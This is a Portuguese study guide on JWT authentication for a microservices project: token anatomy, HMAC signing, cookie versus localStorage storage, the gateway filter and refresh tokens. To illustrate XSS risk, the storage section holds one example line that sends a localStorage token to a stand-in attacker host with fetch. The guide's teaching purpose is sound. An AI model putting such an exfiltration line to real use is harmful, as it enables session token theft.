# JWT do zero: o que é, como funciona, como guardar e como implementar

Guia de estudo escrito a partir do que este projeto faz. Os exemplos apontam para arquivos reais do repositório.

## Índice

1. [O problema que o JWT resolve](#1-o-problema-que-o-jwt-resolve)
2. [Anatomia de um JWT](#2-anatomia-de-um-jwt)
3. [Assinatura: por que ninguém consegue forjar](#3-assinatura-por-que-ninguém-consegue-forjar)
4. [O ciclo de vida completo](#4-o-ciclo-de-vida-completo)
5. [Onde o token deve ir na requisição](#5-onde-o-token-deve-ir-na-requisição)
6. [Onde guardar o token no navegador](#6-onde-guardar-o-token-no-navegador)
7. [Cookie HttpOnly em detalhe](#7-cookie-httponly-em-detalhe)
8. [Como este projeto implementa](#8-como-este-projeto-implementa)
9. [Autenticação vs. autorização](#9-autenticação-vs-autorização)
10. [Expiração, logout e refresh token](#10-expiração-logout-e-refresh-token)
11. [Erros comuns e boas práticas](#11-erros-comuns-e-boas-práticas)
12. [Perguntas de entrevista](#12-perguntas-de-entrevista)
13. [Glossário](#13-glossário)

---

## 1. O problema que o JWT resolve

HTTP é **stateless**: cada requisição chega ao servidor sem memória das anteriores. Se o usuário fez login há 10 segundos, o servidor precisa de alguma forma de saber, a cada requisição, *quem* está chamando.

Duas abordagens clássicas:

| | Sessão no servidor | JWT |
|---|---|---|
| O que o cliente carrega | Um ID aleatório (`JSESSIONID=abc123`) | O próprio dado de identidade, assinado |
| Onde está o "estado" | No servidor (memória/Redis/banco) | No token; o servidor não guarda nada |
| Para validar | Consultar o armazenamento de sessões | Verificar a assinatura (cálculo local) |
| Escala em microsserviços | Exige sessão compartilhada | Qualquer serviço com a chave valida sozinho |
| Revogar na hora | Fácil (apaga a sessão) | Difícil (o token vale até expirar) |

**JWT (JSON Web Token)** é um token **autocontido e assinado**: ele carrega quem é o usuário e o que ele pode fazer, e qualquer serviço que conheça a chave consegue confirmar que não foi adulterado, sem consultar banco. Em microsserviços isso é muito conveniente: o Gateway valida o token sem chamar o `auth-service` a cada requisição.

---

## 2. Anatomia de um JWT

Um JWT são **três partes em Base64URL separadas por ponto**:

```
eyJhbGciOiJIUzM4NCJ9 . eyJzdWIiOiJUb25ob0RldmkiLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3... . 3kF9x...
└────── header ─────┘   └────────────────── payload ─────────────────────────────┘   └ assinatura ┘
```

### Header
Metadados: o algoritmo de assinatura e o tipo.
```json
{ "alg": "HS384" }
```

### Payload (claims)
Os dados. Cada campo é uma *claim*. As padrão (registradas) têm nomes curtos:

| Claim | Significado | Neste projeto |
|---|---|---|
| `sub` | *subject*: de quem é o token | username (`TonhoDevi`) |
| `iat` | *issued at*: quando foi emitido | momento do login |
| `exp` | *expiration*: quando expira | `iat` + 1 hora |
| `iss`, `aud` | emissor e público-alvo | não usados |
| `role` | claim **customizada** | `ADMIN`, `GERENTE`... |

```json
{ "sub": "TonhoDevi", "role": "ADMIN", "iat": 1760000000, "exp": 1760003600 }
```

### Assinatura
O resultado de assinar `header.payload` com uma chave. Detalhado na próxima seção.

> ### ⚠️ Base64 NÃO é criptografia
> O header e o payload são apenas **codificados**, não cifrados. Qualquer pessoa que tenha o token lê o conteúdo (cole um token em [jwt.io](https://jwt.io) e veja). A assinatura garante **integridade** (ninguém alterou), não **sigilo**.
> **Nunca coloque senha, CPF, cartão ou qualquer dado sensível no payload.**

---

## 3. Assinatura: por que ninguém consegue forjar

### HMAC (simétrico), o que este projeto usa
```
assinatura = HMAC-SHA( chave_secreta, base64(header) + "." + base64(payload) )
```
- A **mesma chave** assina e verifica. Aqui é `JWT_SECRET`.
- `auth-service` assina; `gateway-service` verifica. Por isso os dois precisam ter a **mesma** `JWT_SECRET`.
- Quem tem a chave também consegue **criar** tokens válidos. Ela precisa ser longa, aleatória e secreta (mínimo 32 caracteres para HS256).

### RSA / ECDSA (assimétrico)
- Uma **chave privada** assina; uma **chave pública** verifica.
- Só o `auth-service` teria a privada; todos os outros só a pública, e não conseguiriam forjar tokens. É o mais seguro para muitos serviços/equipes, e o padrão de provedores como Keycloak e Auth0.

### Por que adulterar não funciona
Se alguém muda `"role":"GERENTE"` para `"role":"ADMIN"` no payload, o conteúdo muda, mas a assinatura continua sendo a do conteúdo antigo. Ao verificar, o servidor recalcula o HMAC do payload novo, obtém um valor diferente do que está no token e **rejeita**. Sem a chave, o atacante não consegue gerar a assinatura nova.

---

## 4. O ciclo de vida completo

```
   Navegador                         Gateway                     auth-service
       │                                │                             │
 1.    │── POST /auth/login ───────────►│────────────────────────────►│ valida usuário + senha (BCrypt)
       │   {username, password}         │                             │ gera JWT assinado
 2.    │◄─ 200 + Set-Cookie: auth_token=<JWT>; HttpOnly ─────────────│
       │                                │                             │
 3.    │── GET /customers ─────────────►│                             │
       │   Cookie: auth_token=<JWT>     │ verifica assinatura + exp   │
       │   (o navegador anexa sozinho)  │ lê a claim role             │
       │                                │── GET /customers ──► customer-service
 4.    │◄─ 200 [...] ──────────────────│◄────────────────────────────│
       │                                │                             │
 5.    │── GET /customers (token expirado)►│ ✗ expirou                │
       │◄─ 401 ────────────────────────│                             │
       │ (frontend volta para /login)                                 │
```

1. **Login**: o cliente envia as credenciais. O servidor confere a senha (hash BCrypt) e, se estiver certa, **emite** o JWT.
2. **Entrega**: o token volta ao cliente (neste projeto, num cookie `HttpOnly`).
3. **Uso**: em cada requisição o token acompanha a chamada e quem recebe **verifica** assinatura e validade.
4. **Expiração**: depois do `exp`, o token deixa de valer e o usuário precisa logar de novo (ou usar um refresh token).

---

## 5. Onde o token deve ir na requisição

### O padrão: header `Authorization: Bearer`
```
GET /customers HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzM4NCJ9...
```
(Definido na RFC 6750. "Bearer" significa "portador": quem *porta* o token tem acesso.)

### Nunca no body
- GET e DELETE normalmente não têm body.
- Mistura autenticação com dados de negócio; gateways, proxies e filtros trabalham com headers sem parsear o body.
- Foge do padrão que todo o ecossistema espera.

### Nunca na query string (`?token=...`)
Vai para logs de servidor, histórico do navegador, cabeçalho `Referer` e ferramentas de monitoramento.

### A alternativa: cookie
O navegador anexa o cookie sozinho (`Cookie: auth_token=...`). É o que este projeto usa para o navegador. Veja as próximas seções.

---

## 6. Onde guardar o token no navegador

| Local | Lido por JS? | Enviado automaticamente? | Risco principal |
|---|---|---|---|
| `localStorage` | ✅ sim | ❌ não (seu código anexa) | **XSS**: script malicioso lê e rouba |
| `sessionStorage` | ✅ sim | ❌ não | XSS (some ao fechar a aba) |
| Memória (variável JS) | ✅ sim | ❌ não | XSS durante a sessão; perde ao dar F5 |
| **Cookie `HttpOnly`** | ❌ **não** | ✅ sim | **CSRF** (mitigado com `SameSite`) |

### O que é XSS
*Cross-Site Scripting*: o atacante consegue executar JavaScript dentro da sua página (campo não sanitizado, dependência npm comprometida, extensão maliciosa). Com o token no `localStorage`, uma linha basta:
```js
fetch('https://atacante.com/roubo?t=' + localStorage.getItem('auth_token'))
```
O token vai embora e o atacante o usa de qualquer lugar até expirar.

### O que é CSRF
*Cross-Site Request Forgery*: você está logado em `meusistema.com` (cookie guardado). Você visita `site-malicioso.com`, que dispara uma requisição para `meusistema.com`. O navegador **anexa o cookie sozinho**, e o servidor acha que foi você quem pediu. Isso só é possível porque o envio é automático.

### O trade-off
| | localStorage + header | Cookie HttpOnly |
|---|---|---|
| Roubo do token por XSS | vulnerável | **protegido** |
| CSRF | imune | precisa de `SameSite`/token CSRF |

Conclusão prática: para uma aplicação web (SPA) no navegador, **cookie `HttpOnly` + `SameSite` + `Secure`** é geralmente a opção mais segura. Para clientes que não são navegadores (apps mobile, outros serviços, curl) o header `Authorization` continua sendo o natural.

---

## 7. Cookie HttpOnly em detalhe

Cookie é um dado que o **servidor** manda ao navegador via `Set-Cookie`, e que o navegador **devolve automaticamente** nas requisições seguintes ao mesmo domínio.

```
HTTP/1.1 200 OK
Set-Cookie: auth_token=eyJhbG...; Max-Age=3600; Path=/; HttpOnly; SameSite=Strict
```

| Atributo | O que faz |
|---|---|
| `HttpOnly` | `document.cookie` e o JS **não enxergam** o cookie. O navegador ainda o envia nas requisições. Bloqueia o roubo por XSS. |
| `Secure` | Só é enviado por HTTPS. Obrigatório em produção. |
| `SameSite=Strict` | Não é enviado em requisições vindas de **outro site**. Defesa principal contra CSRF. (`Lax` libera navegação de topo por link; `None` libera tudo e exige `Secure`.) |
| `Path=/` | Vale para todas as rotas do domínio. |
| `Max-Age` | Quanto tempo vive. Aqui, igual à validade do JWT. |

**Detalhe importante: "site" ≠ "origem".** `http://localhost:44200` (frontend) e `http://localhost:48080` (gateway) são origens **diferentes** (portas diferentes), mas o mesmo **site** (`localhost`). Por isso o `SameSite=Strict` não bloqueia o cookie neste projeto. Já o CORS, que olha a origem, precisa ser configurado.

**Apagar um cookie:** o servidor manda o mesmo cookie com `Max-Age=0`. Como o JS não consegue mexer em cookie `HttpOnly`, **só o servidor** pode fazer logout de verdade (`POST /auth/logout`).

---

## 8. Como este projeto implementa

### Visão geral
```
frontend (:44200) ──cookie──► gateway (:48080) ──► serviços
                              │ JwtGlobalFilter
                              │  1. extrai o token (cookie, ou Authorization: Bearer)
                              │  2. verifica assinatura e expiração (JJWT)
                              │  3. aplica regras por role
auth-service (:48084): emite o token e define/apaga o cookie
```

### Emissão: `auth-service`
- [`AuthService.login`](../auth-service/src/main/java/br/com/atlastt/auth_service/services/AuthService.java): busca o usuário, compara a senha com `BCryptPasswordEncoder.matches` e pede o token ao `JwtService`. Mensagem de erro **genérica** (`Invalid username or password`) para usuário inexistente e senha errada, evitando *user enumeration*.
- [`JwtService.generateToken`](../auth-service/src/main/java/br/com/atlastt/auth_service/services/JwtService.java): monta o JWT com `subject`, claim `role`, `issuedAt`, `expiration` e assina com HMAC (chave de `JWT_SECRET`).
- [`AuthCookieService`](../auth-service/src/main/java/br/com/atlastt/auth_service/services/AuthCookieService.java): monta o `Set-Cookie` com `HttpOnly`, `Secure` (configurável), `SameSite=Strict`, `Path=/` e `Max-Age`.
- [`AuthController`](../auth-service/src/main/java/br/com/atlastt/auth_service/controllers/AuthController.java):
  - `POST /auth/login`: devolve o cookie no header e `{username, role}` no body. **O token não aparece no body.**
  - `POST /auth/logout`: devolve o cookie com `Max-Age=0`.
  - `GET /auth/me`: devolve quem está logado. Existe porque o JS não consegue ler o cookie e precisa saber o usuário ao recarregar a página.

### Validação: `gateway-service`
[`JwtGlobalFilter`](../gateway-service/src/main/java/br/com/atlastt/gateway_service/filters/JwtGlobalFilter.java) é um `GlobalFilter` (Gateway é reativo/WebFlux, não usa filtros de Servlet):
1. Rotas públicas (`/auth/login`, `/auth/logout`, Swagger, health): passam sem token. A checagem é por **início** do caminho (`startsWith`), não por "contém".
2. Extrai o token: **cookie** `auth_token` primeiro; se não houver, **header `Authorization: Bearer`** (conveniente para curl/Swagger/outros clientes).
3. Verifica assinatura e expiração com `Jwts.parser().verifyWith(chave)`. Falhou: **401**.
4. Lê a claim `role` e aplica regras: `DELETE` e `POST /users` só para `ADMIN`; senão **403**.

O `auth-service` mantém um segundo filtro ([`JwtAuthenticationFilter`](../auth-service/src/main/java/br/com/atlastt/auth_service/configs/JwtAuthenticationFilter.java)) com a mesma lógica de extração, como defesa em profundidade, já que sua porta 48084 pode ser acessada direto.

### CORS com credenciais
No [`application.yml` do gateway](../gateway-service/src/main/resources/application.yml):
```yaml
allowedOrigins: "http://localhost:44200"
allowCredentials: true
```
O navegador só envia/aceita cookies em chamadas cross-origin se o servidor responder `Access-Control-Allow-Credentials: true`, e nesse caso a origem **não pode ser `*`**.

### Frontend (Angular)
- [`credentials.interceptor.ts`](../frontend/src/app/core/interceptors/credentials.interceptor.ts): marca as chamadas ao Gateway com `withCredentials: true`. Sem isso o navegador **não envia** o cookie em requisições cross-origin. O frontend não monta header nenhum nem toca no token.
- [`auth.service.ts`](../frontend/src/app/features/auth/services/auth.service.ts): guarda só `{username, role}` em memória (um `signal`). `loadSession()` chama `/auth/me`; `logout()` chama `/auth/logout`.
- [`app.config.ts`](../frontend/src/app/app.config.ts): `provideAppInitializer` chama `loadSession()` **antes** de qualquer rota. Assim, após um F5 a sessão é restaurada e o `authGuard` já sabe se há usuário.
- [`error.interceptor.ts`](../frontend/src/app/core/interceptors/error.interceptor.ts): em qualquer 401 (exceto login e `/auth/me`), limpa a sessão local e manda para `/login`.
- [`role.guard.ts`](../frontend/src/app/core/guards/role.guard.ts): esconde telas por role. **É só UX**: a segurança real está no Gateway.

### Configuração
| Variável / propriedade | Onde | Para quê |
|---|---|---|
| `JWT_SECRET` | auth + gateway | Chave HMAC. **Precisa ser idêntica** nos dois. |
| `jwt.expiration-ms` | auth | Validade (3600000 = 1 h) |
| `jwt.cookie.name` / `jwt.cookie-name` | auth / gateway | Nome do cookie (`auth_token`) |
| `JWT_COOKIE_SECURE` | auth | `true` em produção (HTTPS). `false` em dev. |

### Testando na mão (curl)
```bash
# Login: o -c salva o cookie num arquivo
curl -i -c cookies.txt -X POST http://localhost:48080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"TonhoDevi","password":"SUA_SENHA"}'
# Veja o header:  Set-Cookie: auth_token=...; HttpOnly; SameSite=Strict

# Chamada autenticada: o -b envia o cookie salvo
curl -b cookies.txt http://localhost:48080/auth/me
curl -b cookies.txt http://localhost:48080/customers

# Alternativa por header (clientes que não são navegador)
curl -H "Authorization: Bearer <token>" http://localhost:48080/customers
```

---

## 9. Autenticação vs. autorização

- **Autenticação**: *quem é você?* Resolvida pelo login + validade do token (401 quando falha).
- **Autorização**: *o que você pode fazer?* Resolvida pela claim `role` + regras (403 quando falha).

| Código | Significado | Exemplo aqui |
|---|---|---|
| **401 Unauthorized** | Não autenticado: sem token, inválido ou expirado | Cookie ausente |
| **403 Forbidden** | Autenticado, mas sem permissão | `GERENTE` tentando `DELETE` |

---

## 10. Expiração, logout e refresh token

### Por que o token expira
Como o servidor não guarda sessões, **não dá para "cancelar" um JWT** antes da hora: se vazar, vale até o `exp`. Por isso tokens têm vida curta (minutos a poucas horas).

### Logout em JWT
Não existe "invalidar no servidor". O logout deste projeto **apaga o cookie** no navegador. O token em si continua tecnicamente válido até expirar, mas já não está com o usuário. Para revogação real:
- **Blacklist** de tokens (guarda IDs `jti` revogados num Redis; perde parte do benefício "stateless");
- **Expiração curta**;
- **Versão do token** por usuário (incrementa a versão ao trocar senha/deslogar e rejeita tokens antigos).

### Refresh token (padrão de mercado, ainda não implementado aqui)
Dois tokens:

| | Access token | Refresh token |
|---|---|---|
| Vida | curta (5 a 15 min) | longa (dias) |
| Uso | em toda requisição | só para pedir um novo access token |
| Onde | cookie `HttpOnly` | cookie `HttpOnly` restrito (`Path=/auth/refresh`) |
| Revogação | por expirar rápido | guardado no servidor, pode ser revogado |

Fluxo: o access token expira, o frontend chama `POST /auth/refresh`, o servidor valida o refresh token e emite um novo access token. O usuário não precisa logar de novo, e um access token roubado vale pouco tempo.

---

## 11. Erros comuns e boas práticas

**Evite**
- Token no body da requisição ou na query string.
- Dados sensíveis no payload (é legível por qualquer um).
- Chave HMAC curta, previsível ou com valor padrão no código (este projeto tem um fallback de dev no `application.yml`, que **deve** ser sobrescrito por `JWT_SECRET` em produção).
- Aceitar `alg: none` ou deixar o cliente escolher o algoritmo. Bibliotecas modernas como JJWT já impedem isso.
- Token que nunca expira.
- Confiar em guard/validação do frontend como segurança: o frontend é só UX.
- Guardar token de longa duração no `localStorage`.

**Faça**
- Expiração curta + refresh token.
- `HttpOnly` + `Secure` + `SameSite` ao usar cookie; HTTPS sempre em produção.
- Validar assinatura **e** `exp` em toda requisição.
- Mensagens de login genéricas; hash BCrypt/Argon2 para senhas.
- Em arquitetura com muitos serviços, considerar chaves assimétricas (RS256/ES256).
- Proteger as portas internas por rede, para que ninguém contorne o Gateway.

---

## 12. Perguntas de entrevista

**Onde o JWT deve ir na requisição?**
No header `Authorization: Bearer <token>` (ou num cookie `HttpOnly` em aplicações web). Não no body nem na URL.

**JWT é criptografado?**
Não. É assinado (integridade), não cifrado (sigilo). O payload é legível.

**Qual a diferença entre HS256 e RS256?**
HS256 usa uma chave compartilhada que assina e verifica. RS256 usa par de chaves: privada assina, pública verifica. RS256 é melhor quando muitos serviços só precisam verificar.

**Como invalidar um JWT?**
Não dá diretamente. Usa-se expiração curta, blacklist de `jti` ou versionamento de token.

**localStorage ou cookie?**
`localStorage` está exposto a XSS. Cookie `HttpOnly` protege contra roubo do token, mas exige proteção contra CSRF (`SameSite`, token CSRF).

**O que é CSRF e por que o header Bearer é imune?**
Ataque que faz o navegador enviar a requisição com credenciais anexadas automaticamente. Com o header `Authorization`, o navegador nunca anexa o token sozinho, então o atacante não consegue.

**JWT ou sessão?**
JWT escala melhor entre serviços (sem estado compartilhado), mas é mais difícil de revogar. Sessão é simples de revogar, mas exige armazenamento compartilhado.

**Diferença entre 401 e 403?**
401: não autenticado. 403: autenticado sem permissão.

---

## 13. Glossário

| Termo | Significado |
|---|---|
| **Claim** | Campo do payload (`sub`, `exp`, `role`...) |
| **Bearer** | "Portador": quem apresenta o token é aceito |
| **HMAC** | Código de autenticação com chave secreta, usado na assinatura simétrica |
| **Stateless** | O servidor não guarda estado entre requisições |
| **XSS** | Injeção de JavaScript malicioso na página |
| **CSRF** | Fazer o navegador do usuário enviar requisições forjadas com seu cookie |
| **CORS** | Regras do navegador sobre requisições entre origens diferentes |
| **Origem** | esquema + host + porta (`http://localhost:44200`) |
| **Site** | esquema + domínio registrável (a porta não conta) |
| **BCrypt** | Algoritmo de hash de senha, lento de propósito |
| **`jti`** | ID único do token, útil para blacklist |
| **Access / Refresh token** | Token curto para acessar / token longo para renovar |
